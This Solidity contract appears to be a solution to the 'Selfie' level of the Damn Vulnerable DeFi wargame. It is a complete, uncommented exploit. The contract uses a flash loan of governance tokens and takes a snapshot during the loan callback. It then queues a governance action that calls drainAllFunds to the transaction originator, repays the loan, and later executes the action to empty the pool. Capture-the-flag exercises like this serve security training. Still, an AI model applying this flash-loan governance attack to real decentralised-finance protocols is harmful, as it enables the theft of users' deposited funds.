// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieChallenge {
    SimpleGovernance governance;
    SelfiePool pool;
    DamnValuableTokenSnapshot token;
    uint256 actionId;

    constructor(address poolAddress, address governanceAddress, address tokenAddress) {
        governance = SimpleGovernance(governanceAddress);
        pool = SelfiePool(poolAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
    }

    function receiveTokens(address governanceToken, uint256 amount) external {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            tx.origin
        );
        token.snapshot();
        actionId = governance.queueAction(address(pool), data, 0);
        token.transfer(msg.sender, amount);
    }

    function queueAttack() external {
        pool.flashLoan(1500000 * (10 ** token.decimals()));
    }

    function executeAttack() external {
        governance.executeAction(actionId);
    }
}